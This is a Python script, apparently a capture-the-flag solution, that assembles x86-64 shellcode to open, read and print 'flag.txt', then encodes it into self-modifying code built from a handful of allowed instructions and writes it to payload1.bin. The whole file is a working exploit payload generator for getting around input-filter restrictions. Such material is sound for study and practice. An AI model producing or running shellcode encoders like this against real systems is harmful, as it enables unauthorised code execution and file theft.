import os
os.chdir(os.path.dirname(__file__))

MOVE_PTR = b"\x66\xff\xc7" # inc di
INC_VAL = b"\xff\x07" # inc dword ptr [rdi]

code = [
    # b"\x48\x89\xec", # mov rsp, rbp (uncomment if rsp is misaligned, but it shouldnt be)
    b"\x6a\x00", # push 0x0
    b"\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74", # movabs rax, 0x78742e67616c662f
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x6a\x02", # push 2
    b"\x58", # pop rax
    b"\x5f", # pop rdi
    b"\x31\xf6", # xor esi, esi
    b"\x31\xd2", # xor edx, edx
    b"\x0f\x05", # syscall
    b"\x50", # push rax
    b"\x54", # push rsp
    b"\x5e", # pop rsi
    b"\x5f", # pop rdi
    b"\x31\xc0", # xor eax, eax
    b"\xb2\x7f", # mov dl, 0x7f
    b"\x0f\x05", # syscall
    b"\x89\xc2", # mov edx, eax
    b"\xb0\x01", # mov al, 1
    b"\x89\xc7", # mov edi, eax
    b"\x0f\x05", # syscall
    # b"\xf4", # hlt
]
GOAL = b"".join(code)

start = (
    b"\x5f" + # pop rdi
    b"\x5f" + # pop rdi
    b"\x5f" + # pop rdi
    b"\x5f" # pop rdi
)

out_payload = bytearray(start)
emulated_payload = bytearray(start)
ext = lambda val: [out_payload.extend(val), emulated_payload.extend(val)]

def adc(data, idx):
    while True:
        data[idx] = (data[idx] + 1) & 0xff
        if data[idx] != 0:
            break
        idx += 1

for i, byte in enumerate(GOAL):
    cur_num = memoryview(out_payload[i:i+4].ljust(4, b"\0")).cast('I')
    while emulated_payload[i] != byte:
        ext(INC_VAL)
        adc(emulated_payload, i)
    
    if i != len(GOAL) - 1:
        ext(MOVE_PTR)

out_payload.extend(b"\xff\xe2")

print(hex(len(out_payload)))
print(out_payload[:20])
with open("payload1.bin", "wb") as f:
    f.write(out_payload)
